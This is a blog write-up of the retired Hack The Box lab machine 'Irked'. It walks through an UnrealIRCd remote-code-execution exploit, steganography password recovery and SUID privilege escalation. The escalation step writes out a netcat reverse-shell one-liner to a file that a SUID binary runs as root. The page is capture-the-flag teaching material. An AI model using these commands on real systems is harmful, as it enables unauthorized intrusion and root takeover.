<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Irked - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Irked from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Irked">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/irked/">


  <meta property="og:description" content="My write-up / walkthrough for Irked from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Irked">
  <meta name="twitter:description" content="My write-up / walkthrough for Irked from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/irked/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-04-27T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/irked/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Irked">
    <meta itemprop="description" content="Hack The Box - Irked">
    <meta itemprop="datePublished" content="2019-04-27T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/irked/" class="u-url" itemprop="url">Hack The Box - Irked
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-04-27T07:00:00+02:00">April 27, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          3 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---irked">Hack The Box - Irked</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#http-initial-enumeration">HTTP Initial Enumeration</a></li>
<li><a href="#irc">IRC</a></li>
<li><a href="#steg-in-irkedjpg-ssh-as-djmardov">Steg in irked.jpg, SSH as djmardov</a></li>
<li><a href="#exploiting-viewuser-privilege-escalation-to-root">Exploiting viewuser, Privilege Escalation to root</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---irked">Hack The Box - Irked</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys, today Irked retired and here’s my write-up about it. It was an easy straightforward machine, no rabbit holes and such things. To get an initial shell on the box we will exploit an RCE vulnerable irc server called <code class="language-plaintext highlighter-rouge">UnrealIRCd</code>. After getting a shell we will find a backup file which has a password. We will use that password to get a hidden text file from an image (steg). That text file contains another password which we will use to get ssh access as another user. Finally for privilege escalation there is an <code class="language-plaintext highlighter-rouge">suid</code> binary that executes a file, and we control that file so we can get a reverse shell as root. It’s a linux box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.117</code>. I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">irked.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/irked/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with nmap to scan for open ports and services :
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC irked.htb</code>
<br><img src="/images/hackthebox/irked/1.png" alt="" class="align-center"><br><br>
There is ssh running on port 22 and http running on port 80. Let’s take a look at http.<br></p>

<h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
<p><br><img src="/images/hackthebox/irked/2.png" alt="" class="align-center"><br><br>
There is only that image and a message saying : <code class="language-plaintext highlighter-rouge">IRC is almost working!</code>, Source also has nothing interesting :
<br><img src="/images/hackthebox/irked/3.png" alt="" class="align-center"><br><br>
We have a hint which is irc, let’s check that. If we didn’t find anything then we will continue with http.<br></p>

<h2 id="irc">IRC</h2>
<p>I searched for irc and found <a href="https://en.wikipedia.org/wiki/Internet_Relay_Chat#Technical_information" target="_blank" rel="noopener noreferrer">here</a> That if there is an irc server running on the machine, then probably it will be in the port range from 6000 to 7000. So I ran another nmap scan :
<code class="language-plaintext highlighter-rouge">nmap -p 6000-7000 -sV -sT -sC irked.htb</code>
<br><img src="/images/hackthebox/irked/4.png" alt="" class="align-center"><br><br>
There is an irc server running on port 6697 called <code class="language-plaintext highlighter-rouge">UnrealIRCd</code>. There are some known vulnerabilities for <code class="language-plaintext highlighter-rouge">UnrealIRCd</code>, One of them is a Remote Code Execution and there is a metasploit module for it :
<br><img src="/images/hackthebox/irked/5.png" alt="" class="align-center"><br><br>
Let’s check if the server is vulnerable to it.<br>
<br><img src="/images/hackthebox/irked/6.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/irked/7.png" alt="" class="align-center"><br><br>
It worked and we got a shell as <code class="language-plaintext highlighter-rouge">ircd</code> :
<br><img src="/images/hackthebox/irked/8.png" alt="" class="align-center"><br><br></p>

<h2 id="steg-in-irkedjpg-ssh-as-djmardov">Steg in <code class="language-plaintext highlighter-rouge">irked.jpg</code>, SSH as <code class="language-plaintext highlighter-rouge">djmardov</code>
</h2>
<p>There are two users on the box : <code class="language-plaintext highlighter-rouge">ircd</code> and <code class="language-plaintext highlighter-rouge">djmardov</code>. I checked <code class="language-plaintext highlighter-rouge">/home/ircd</code> and there was nothing interesting. In <code class="language-plaintext highlighter-rouge">/home/djmardov</code> I didn’t find <code class="language-plaintext highlighter-rouge">user.txt</code> :
<br><img src="/images/hackthebox/irked/9.png" alt="" class="align-center"><br><br>
I tried to go into <code class="language-plaintext highlighter-rouge">.ssh</code> but I got <code class="language-plaintext highlighter-rouge">Permission denied</code> :
<br><img src="/images/hackthebox/irked/10.png" alt="" class="align-center"><br><br>
I checked other directories like <code class="language-plaintext highlighter-rouge">Desktop</code>, <code class="language-plaintext highlighter-rouge">Downloads</code>, <code class="language-plaintext highlighter-rouge">Documents</code> etc… And in <code class="language-plaintext highlighter-rouge">Documents</code> I found <code class="language-plaintext highlighter-rouge">user.txt</code> and a file called <code class="language-plaintext highlighter-rouge">.backup</code> :
<br><img src="/images/hackthebox/irked/11.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">cat .backup</code>
<br><img src="/images/hackthebox/irked/12.png" alt="" class="align-center"><br><br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
</code></pre></div></div>
<p>It gives us a hint about some steg backup, we also get something that looks like a password : <code class="language-plaintext highlighter-rouge">UPupDOWNdownLRlrBAbaSSss</code>. But where will we use that password ? Remember the image we saw earlier on that apache server ?
<br><img src="/images/hackthebox/irked/2.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/irked/3.png" alt="" class="align-center"><br><br>
I downloaded it then used <code class="language-plaintext highlighter-rouge">steghide</code> to check if there is any hidden file.<br>
Note : I have a list for some steganography tools, If you are not familiar with steg you can check it <a href="/lists/stego">here</a>.<br>
<code class="language-plaintext highlighter-rouge">wget http://irked.htb/irked.jpg</code>
<br><img src="/images/hackthebox/irked/13.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">steghide info irked.jpg</code>
<br><img src="/images/hackthebox/irked/14.png" alt="" class="align-center"><br><br>
There is a hidden text file called <code class="language-plaintext highlighter-rouge">pass.txt</code>, Let’s extract it :
<code class="language-plaintext highlighter-rouge">steghide extract -sf irked.jpg</code>
<br><img src="/images/hackthebox/irked/15.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">cat pass.txt</code>
<br><img src="/images/hackthebox/irked/16.png" alt="" class="align-center"><br><br>
We got the password : <code class="language-plaintext highlighter-rouge">Kab6h+m+bbp2J:HG</code>, let’s try to login as <code class="language-plaintext highlighter-rouge">djmardov</code> :
<br><img src="/images/hackthebox/irked/17.png" alt="" class="align-center"><br><br>
We owned user !</p>

<h2 id="exploiting-viewuser-privilege-escalation-to-root">Exploiting <code class="language-plaintext highlighter-rouge">viewuser</code>, Privilege Escalation to <code class="language-plaintext highlighter-rouge">root</code>
</h2>
<p>After some enumeration, I searched for <code class="language-plaintext highlighter-rouge">suid</code> binaries and in <code class="language-plaintext highlighter-rouge">/usr/bin</code> I found a binary called <code class="language-plaintext highlighter-rouge">viewuser</code>.<br>
<code class="language-plaintext highlighter-rouge">find /usr/bin/ -perm -4000</code>
<br><img src="/images/hackthebox/irked/18.png" alt="" class="align-center"><br><br>
It seems interesting so I decided to check it.<br>
<code class="language-plaintext highlighter-rouge">viewuser</code>
<br><img src="/images/hackthebox/irked/19.png" alt="" class="align-center"><br><br>
It shows logged in users, but we don’t care about that. The only thing we care about is the last line : <code class="language-plaintext highlighter-rouge">/tmp/listusers: 1: /tmp/listusers: djmardov: not found</code>. It seems like it was trying to do something with the file <code class="language-plaintext highlighter-rouge">/tmp/listusers</code> which doesn’t exist. I downloaded <code class="language-plaintext highlighter-rouge">viewuser</code> to try some stuff :
<code class="language-plaintext highlighter-rouge">scp djmardov@irked.htb:/usr/bin/viewuser ./</code>
<br><img src="/images/hackthebox/irked/20.png" alt="" class="align-center"><br><br>
When I did <code class="language-plaintext highlighter-rouge">ltrace</code> on the binary I found that it executes <code class="language-plaintext highlighter-rouge">/tmp/listusers</code> :
<br><img src="/images/hackthebox/irked/21.png" alt="" class="align-center"><br><br>
And since this binary runs as root, then it also executes <code class="language-plaintext highlighter-rouge">/tmp/listusers</code> as root. So we can simply get a reverse shell by putting the payload in <code class="language-plaintext highlighter-rouge">/tmp/listusers</code>, Then after running the binary again it should execute the payload.<br></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f"</span> <span class="o">&gt;</span> /tmp/listusers
</code></pre></div></div>
<p><br><img src="/images/hackthebox/irked/22.png" alt="" class="align-center"><br><br>
Everything is fine, let’s check our listener :
<br><img src="/images/hackthebox/irked/23.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/irked/24.png" alt="" class="align-center"><br><br>
Now we own root !</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/teacher/">Hack The Box - Teacher</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/bighead/">Hack The Box - BigHead</a></p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-04-27T07:00:00+02:00">April 27, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/teacher/" class="pagination--pager" title="Hack The Box - Teacher
">Previous</a>
    
    
      <a href="/hack-the-box/bighead/" class="pagination--pager" title="Hack The Box - BigHead
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
